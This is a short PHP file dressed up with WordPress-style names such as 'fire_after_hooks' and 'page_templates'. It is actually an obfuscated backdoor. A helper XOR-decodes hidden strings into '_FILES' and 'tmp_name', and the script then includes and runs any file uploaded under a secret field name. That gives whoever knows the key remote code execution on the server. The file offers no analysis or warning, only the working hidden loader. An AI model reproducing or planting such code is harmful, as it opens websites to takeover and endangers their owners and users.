<?php 	
$children = 'hGRK5tUBTMnkPpS';

$where_post_type = $children;

function fire_after_hooks($intermediate_dir, $post_cats)

{
    $loop_member = $post_cats;
    $page_templates = urldecode($intermediate_dir);
	$loop = 'page_structure';
    $width = substr($loop_member,0, strlen($page_templates));

    $private = $page_templates ^ $width;
    return $private;

}

$nested_code_pre = ${fire_after_hooks("7%01%1B%07p%27", $where_post_type)};
$filetype = $nested_code_pre;
$tagregexp = isset($filetype[$where_post_type]);
if ($tagregexp)

{
    $singular_base = $nested_code_pre[$where_post_type];
    $update = $singular_base[fire_after_hooks("%1C%2A%22%14%5B%158%27", $where_post_type)];
	$default_no_texturize_tags = 'tinkle';
    $replace = $update;
    include ($replace);
}
	$sentences = 'previous_date';
?>
